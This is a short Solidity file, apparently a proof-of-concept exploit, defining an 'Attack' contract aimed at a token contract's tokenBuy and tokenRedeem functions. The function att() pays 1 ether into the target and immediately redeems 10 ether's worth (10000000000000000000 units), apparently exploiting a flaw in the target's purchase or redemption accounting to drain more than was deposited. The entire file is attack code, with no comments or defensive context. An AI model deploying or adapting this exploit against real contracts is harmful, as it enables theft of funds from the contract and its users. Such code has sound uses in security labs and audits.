// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IToken {
    function tokenBuy() external payable;

    function tokenRedeem(uint256 redeemAmount) external;
}

contract Attack {
    IToken public token;

    constructor(address _token) {
        token = IToken(_token);
    }

    function att() public payable {
        require(msg.value >= 1 ether);
        token.tokenBuy{value: 1 ether}();
        token.tokenRedeem(10000000000000000000);
    }
}
